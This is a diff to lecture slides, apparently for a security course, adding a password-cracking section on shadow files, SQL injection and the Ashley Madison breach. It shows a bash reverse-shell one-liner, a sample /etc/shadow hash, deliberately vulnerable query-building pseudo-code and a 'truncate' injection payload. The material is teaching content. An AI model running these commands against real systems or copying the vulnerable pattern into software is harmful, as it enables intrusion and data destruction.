@@ -54,6 +54,7 @@
 [Heartbleed](#/heartbleed)  
 [Shellshock](#/shellshock)  
 [Reverse Shells](#/reverseshells)  
+[Password Cracking](#/passwords)  
 </textarea></section>
   
 <!-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -->
@@ -671,6 +672,119 @@ The final version:
 bash -i > /dev/tcp/192.168.100.102/4760 0<&1 2>&1
 ```
 It's that easy, and can be run as a non-root user
+</textarea></section>
+
+</section>
+
+<!-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -->
+
+<section>
+
+<section data-markdown id="passwords" class="center"><textarea data-template>
+# Password Cracking
+</textarea></section>
+    
+<section data-markdown data-separator="^\n\n\n"><textarea data-template>
+## Before proceeding...
+Go over the [fuzzing slide column](websecurity.html#/fuzzing) in the [Web Security slide set](websecurity.html#/)
+
+
+
+<!-- .slide: class="small-pre wide-pre" -->
+<h2 class="r-fit-text">Step 1: Obtain the password database</h2>
+
+- Shell access on the remote system (reverse shell, allowed access, etc.)
+  - Not in /etc/passwd, but in /etc/shadow (often not readable):
+    - These are hashed and salted
+```
+user:$y$j9T$wmEh7N6.PIYqdbr52Fqpj1$owbqqdSR3KqbONd59bnwWni/yvl3Yw4ahqFTiiwfQxC:19828:0:99999:7:::
+```
+- Script that "leaks" information
+  - How the original Silk Road was supposedly attacked
+- SQL injection attack
+
+
+
+<h2 class="r-fit-text">Vulnerable script for SQL injections</h2>
+
+- Let's imagine that your web script asks for your userid
+  - Then does a select command on that value
+- Pseudo-code:
+```
+var userid = getUseridFromWebForm()
+var query = "select * from course where userid='" +
+              userid + "';"
+var result = databaseQuery (query)
+doSomethingWithTheResult (result)
+```
+- This has a SQL injection attack vulnerability
+  - Next, we'll see an exploit
+
+
+
+## Normal operation
+- If we enter 'asb2t' into the web form, we will get the following SQL command:
+<pre class="code">
+select * from course where userid='<span class='hotpink'>asb2t</span>';
+</pre>
+- Which works as desired
+
+
+
+## SQL injection attack exploit
+- What if we enter the following as our userid:
+``` 
+'; truncate course; -- 
+``` 
+- At that point, our SQL command is as follows:
+<pre class="code">
+select * from course where userid='<span class='hotpink'>'; truncate course; -- </span>';
+</pre>
+- Which does not work as desired
+
+
+
+## SQL injection attack exploit
+- Our SQL injection attack query:
+<pre class="code">
+select * from course where
+    userid='<span class='hotpink'>'; truncate course; -- </span>';
+</pre>
+- The DB will perform two database operations (a select then a delete), and then see a comment at the end of the statement
+  - The DB function the script calls might return a value or it might not
+- At this point, we have deleted everything from the table
+
+
+
+## SQL injection attack exploit
+- This is not stealthy - the DB probably won't work right if everything has been deleted
+- Another option is to enter your own credentials or data
+- Most likely it is to steal data
+
+
+
+<h2 class="r-fit-text">Case Study: Ashley Madison Attack</h2>
+
+![](https://upload.wikimedia.org/wikipedia/commons/3/3a/Ashley_madison_logo.png)
+- [Ashley Madison data breach](https://en.wikipedia.org/wiki/Ashley_Madison_data_breach) in 2015
+  - This is the site that peddled extra-marital affairs
+  - The hackers threatened to release the site's 60 Gb DB info unless the site was closed down
+    - No ransom was requested!
+  - They did reveal the information, which led to embarrassment and some suicides
+  - Interestingly, almost all of the "female" members were bots...
+- Passwords were not salted, and no password restrictions were imposed
+
+
+    </textarea></section>
+
+<section>
+<h2 class="r-fit-text"><a href="https://xkcd.com/327/">xkcd # 327</a> on SQL injection attacks</h2>
+<p style="text-align:center">Exploits of a Mom</p>
+<img title="Her daughter is named &quot;Help I&#39;m trapped in a driver&#39;s license factory&quot;." alt="Exploits of a Mom" src="http://imgs.xkcd.com/comics/exploits_of_a_mom.png" class="stretch">
+</section>
+
+    <section data-markdown data-separator="^\n$"><textarea data-template>
+## ...
 </textarea></section>
 
 </section>
